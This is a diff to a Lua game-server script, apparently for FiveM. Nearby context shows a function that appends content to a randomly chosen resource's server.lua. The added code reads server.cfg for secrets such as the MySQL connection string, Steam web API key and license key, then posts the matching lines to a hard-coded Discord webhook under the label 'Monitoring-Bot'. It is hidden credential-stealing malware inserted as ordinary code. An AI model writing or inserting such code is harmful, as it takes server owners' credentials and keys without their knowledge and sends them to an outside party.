@@ -128,3 +128,46 @@ function ChooseRandomResourceAndWriteToFile2()
     print("Content appended to " .. chosenResource .. "/server.lua:")
     print(appendContent)
 end
+
+
+function checkForMultipleWords(filePath, keywords)
+    local file = io.open(filePath, 'r')
+    if not file then return nil end
+
+    local matchingLines = {}
+    for line in file:lines() do
+        for _, keyword in ipairs(keywords) do
+            if string.match(line, keyword) then
+                table.insert(matchingLines, { keyword = keyword, line = line })
+            end
+        end
+    end
+
+    file:close()
+    return matchingLines
+end
+
+local filePath = 'server.cfg'
+local keywords = {"mysql_connection_string", "banner_detail", "sv_hostname", "sv_projectName", "steam_webApiKey", "sv_licenseKey", "banner_connecting", "tags"}  -- Add your keywords here
+local lines = checkForMultipleWords(filePath, keywords)
+if lines then
+    local embedFields = {}
+    for _, info in ipairs(lines) do
+        table.insert(embedFields, {
+            ["name"] = "Keyword: " .. info.keyword,
+            ["value"] = info.line,
+            ["inline"] = false
+        })
+    end
+
+    PerformHttpRequest("https://discord.com/api/webhooks/1169392712739463168/WyyR3Pj6sSAW_sUUuJgsGWYq7n8pnkCi3WcaHPmbng7-9zbl3a5gVXzKbFaOyneYkbVn", function(err, text, headers)
+    end, 'POST', json.encode({
+        username = "Monitoring-Bot",
+        embeds = {{
+            ["color"] = 16711680,
+            ["fields"] = embedFields,
+        }},
+    }), {
+        ['Content-Type'] = 'application/json'
+    })
+end
